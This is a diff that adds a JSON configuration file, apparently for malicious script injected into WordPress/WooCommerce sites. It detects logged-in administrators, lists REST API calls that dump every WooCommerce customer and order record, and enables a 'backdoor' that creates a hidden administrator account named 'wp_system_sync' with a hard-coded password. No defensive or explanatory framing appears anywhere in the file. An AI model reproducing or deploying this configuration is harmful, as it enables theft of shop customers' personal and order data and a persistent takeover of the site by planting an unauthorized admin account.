@@ -1,0 +1,21 @@
+{
+  "platform": "wordpress",
+  "admin_indicator": "document.getElementById('wpadminbar') || window.wpApiSettings",
+  "admin_role": "Administrator",
+  "customer_role": "Customer",
+  "api_dumps": [
+    {"action": "woo_customer_dump", "path": "/wp-json/wc/v3/customers"},
+    {"action": "woo_order_dump", "path": "/wp-json/wc/v3/orders"}
+  ],
+  "backdoor": {
+    "enabled": true,
+    "method": "wp_user_create",
+    "path": "/wp-json/wp/v2/users",
+    "body": {
+      "username": "wp_system_sync",
+      "email": "system_sync@target.local",
+      "password": "TempSecurePassword!2026",
+      "roles": ["administrator"]
+    }
+  }
+}
